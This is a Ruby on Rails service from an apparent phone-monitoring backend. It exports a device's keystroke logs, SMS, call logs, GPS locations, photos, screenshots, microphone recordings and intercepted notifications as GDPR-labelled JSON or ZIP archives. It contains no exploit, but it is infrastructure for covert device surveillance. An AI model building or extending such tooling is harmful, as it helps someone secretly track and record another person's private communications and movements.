require 'json'
require 'zip'

class DataExportService < ApplicationService
  DATA_DICTIONARY = {
    keylogs: {
      description: 'Keystroke logging data captured from the device',
      fields: { keystroke: 'The captured keystroke text', app_package: 'Application where keystroke was captured',
                 event_type: 'Type of key event', client_timestamp: 'Timestamp from device' }
    },
    contacts: {
      description: 'Contact information stored on the device',
      fields: { filename: 'Contact data file reference' }
    },
    sms_messages: {
      description: 'SMS messages sent and received on the device',
      fields: { filename: 'SMS data file reference' }
    },
    call_logs: {
      description: 'Call history from the device',
      fields: { filename: 'Call log data file reference', date: 'Date of the call' }
    },
    geo_locations: {
      description: 'GPS location data recorded from the device',
      fields: { latitude: 'GPS latitude coordinate', longitude: 'GPS longitude coordinate' }
    },
    pictures: {
      description: 'Photos captured from the device camera',
      fields: { filename: 'Photo file reference' }
    },
    screenshots: {
      description: 'Screen captures from the device',
      fields: { filename: 'Screenshot file reference' }
    },
    recordings: {
      description: 'Audio recordings captured from the device microphone',
      fields: { filename: 'Recording file reference', date: 'Date of the recording' }
    },
    device_notifications: {
      description: 'Notifications intercepted from the device',
      fields: { package_name: 'Application package name', title: 'Notification title',
                 text: 'Notification content', post_time: 'Time notification was posted' }
    }
  }.freeze

  def initialize(smartphone)
    @smartphone = smartphone
  end

  def call
    export_as_json
  end

  # Export all data as a structured JSON hash
  def export_as_json
    export = build_export_structure

    Result.success(export)
  rescue => e
    Rails.logger.error("[DataExportService] Export failed for device #{@smartphone.device_id}: #{e.message}")
    Result.failure(e.message)
  end

  # Export all data as a ZIP file containing JSON files per data type
  def export_as_zip
    export = build_export_structure
    zip_path = generate_zip(export)

    audit_export

    Result.success(zip_path)
  rescue => e
    Rails.logger.error("[DataExportService] ZIP export failed: #{e.message}")
    Result.failure(e.message)
  end

  private

  def build_export_structure
    {
      export_metadata: {
        device_id: @smartphone.device_id,
        device_name: @smartphone.name,
        exported_at: Time.current.iso8601,
        legal_basis: 'GDPR Article 15 - Right of Access',
        format: 'JSON',
        data_controller: ENV.fetch('DATA_CONTROLLER_NAME', 'System Administrator'),
        data_controller_contact: ENV.fetch('DATA_CONTROLLER_EMAIL', 'admin@example.com')
      },
      data_dictionary: DATA_DICTIONARY,
      data: export_all_data
    }
  end

  def export_all_data
    {
      keylogs: safe_export(:keylogs) { @smartphone.keylogs.order(:created_at).as_json(except: [:id]) },
      contacts: safe_export(:contacts) { @smartphone.contacts.order(:created_at).as_json(except: [:id]) },
      sms_messages: safe_export(:sms_messages) { @smartphone.sms_messages.order(:created_at).as_json(except: [:id]) },
      call_logs: safe_export(:call_logs) { @smartphone.call_logs.order(:created_at).as_json(except: [:id]) },
      geo_locations: safe_export(:geo_locations) { @smartphone.geo_locations.order(:created_at).as_json(except: [:id]) },
      pictures: safe_export(:pictures) { @smartphone.pictures.order(:created_at).as_json(except: [:id]) },
      screenshots: safe_export(:screenshots) { @smartphone.screenshots.order(:created_at).as_json(except: [:id]) },
      recordings: safe_export(:recordings) { @smartphone.recordings.order(:created_at).as_json(except: [:id]) },
      device_notifications: safe_export(:device_notifications) do
        DeviceNotification.where(device_id: @smartphone.device_id).order(:created_at).as_json(except: [:id])
      end
    }
  end

  def safe_export(data_type)
    { records: yield, count: nil }.tap { |h| h[:count] = h[:records].size }
  rescue => e
    Rails.logger.warn("[DataExportService] Failed to export #{data_type}: #{e.message}")
    { records: [], count: 0, error: e.message }
  end

  def generate_zip(export)
    timestamp = Time.current.strftime('%Y%m%d_%H%M%S')
    zip_filename = "gdpr_export_#{@smartphone.device_id}_#{timestamp}.zip"
    zip_dir = Rails.root.join('tmp', 'gdpr_exports')
    FileUtils.mkdir_p(zip_dir)
    zip_path = zip_dir.join(zip_filename)

    Zip::OutputStream.open(zip_path.to_s) do |zip|
      zip.put_next_entry('metadata.json')
      zip.write(JSON.pretty_generate(export[:export_metadata]))

      zip.put_next_entry('data_dictionary.json')
      zip.write(JSON.pretty_generate(export[:data_dictionary]))

      export[:data].each do |data_type, data|
        zip.put_next_entry("data/#{data_type}.json")
        zip.write(JSON.pretty_generate(data))
      end

      zip.put_next_entry('README.txt')
      zip.write(export_readme)
    end

    zip_path.to_s
  end

  def export_readme
    <<~README
      GDPR Data Export
      ================
      Device: #{@smartphone.device_id} (#{@smartphone.name})
      Exported: #{Time.current.iso8601}
      Legal Basis: GDPR Article 15 - Right of Access

      This archive contains all personal data associated with the above device.

      Files:
        metadata.json       - Export metadata and data controller information
        data_dictionary.json - Description of all data fields
        data/*.json          - Actual data files per category
        README.txt           - This file

      For questions about this export, contact: #{ENV.fetch('DATA_CONTROLLER_EMAIL', 'admin@example.com')}
    README
  end

  def audit_export
    AuditService.log(
      action: 'read',
      auditable: @smartphone,
      metadata: {
        gdpr_action: 'data_export',
        device_id: @smartphone.device_id,
        legal_basis: 'GDPR Article 15'
      }
    )
  rescue => e
    Rails.logger.error("[DataExportService] Audit logging failed: #{e.message}")
  end
end
